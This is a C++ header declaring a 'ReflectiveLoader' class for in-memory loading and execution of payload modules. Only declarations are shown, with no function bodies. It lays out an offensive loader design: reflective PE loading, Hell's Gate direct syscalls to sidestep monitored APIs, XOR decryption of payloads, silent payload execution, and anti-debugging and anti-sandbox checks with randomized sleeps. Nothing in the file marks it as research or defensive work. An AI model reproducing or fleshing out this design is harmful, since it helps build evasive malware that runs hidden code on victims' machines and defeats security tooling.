#pragma once
#include <windows.h>
#include <winternl.h>
#include <intrin.h>
#include <vector>
#include <string>
#include <map>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "onecore.lib")

// Structure definitions for reflective loading
typedef struct _IMAGE_RELOCATION_ENTRY {
    WORD Offset : 12;
    WORD Type : 4;
} IMAGE_RELOCATION_ENTRY, *PIMAGE_RELOCATION_ENTRY;

typedef BOOL(WINAPI* fnDllMain)(HINSTANCE, DWORD, LPVOID);
typedef int (WINAPI* fnPayloadStart)();

class ReflectiveLoader
{
private:
    // Internal state
    static HANDLE g_hHeap;
    static std::map<LPVOID, SIZE_T> g_loadedModules;
    
    // PE validation
    static BOOL IsValidPE(LPVOID pImageBase);
    static BOOL IsValidPEMemory(LPVOID pImageBase, SIZE_T dwImageSize);
    
    // Core reflective loading functions
    static LPVOID LoadLibraryReflective(LPVOID pImageBase);
    static LPVOID LoadLibraryReflectiveMemory(LPVOID pImageBase, SIZE_T dwImageSize);
    
    // PE processing
    static BOOL ResolveImports(LPVOID pImageBase);
    static BOOL ProcessRelocations(LPVOID pImageBase, ULONG_PTR dwDelta);
    static BOOL ProcessTlsCallbacks(LPVOID pImageBase, DWORD dwReason);
    static DWORD GetExportFunction(LPVOID pImageBase, LPCSTR lpProcName);
    
    // Memory management
    static LPVOID AllocateMemory(SIZE_T dwSize);
    static VOID FreeMemory(LPVOID lpAddress);
    
    // Hells Gate for direct syscalls (in C++)
    static ULONG_PTR ExtractSSN(LPCSTR lpFunctionName);
    static LPVOID CreateSyscallStub(ULONG_PTR ssn);
    
public:
    // Initialization
    static BOOL Initialize();
    static VOID Cleanup();
    
    // Main reflective loading functions
    static LPVOID LoadFromMemory(LPVOID pImageBase, SIZE_T dwImageSize);
    static LPVOID LoadFromFile(LPCSTR lpFilePath);
    static LPVOID LoadFromResource(HMODULE hModule, LPCSTR lpResourceName, LPCSTR lpResourceType);
    
    // Payload execution
    static int ExecutePayload(LPVOID pModule, LPCSTR lpFunctionName = "Start");
    static int ExecutePayloadSilent(LPVOID pModule);
    
    // Cleanup
    static BOOL Unload(LPVOID pModule);
    static BOOL UnloadAll();
    
    // Utility
    static LPVOID GetModuleBase(LPVOID pModule);
    static DWORD GetModuleSize(LPVOID pModule);
    static std::vector<BYTE> XorDecrypt(const std::vector<BYTE>& data, const std::vector<BYTE>& key);
    
    // Anti-debug/anti-sandbox
    static BOOL IsDebugged();
    static VOID SleepRandom(DWORD dwMinMs, DWORD dwMaxMs);
};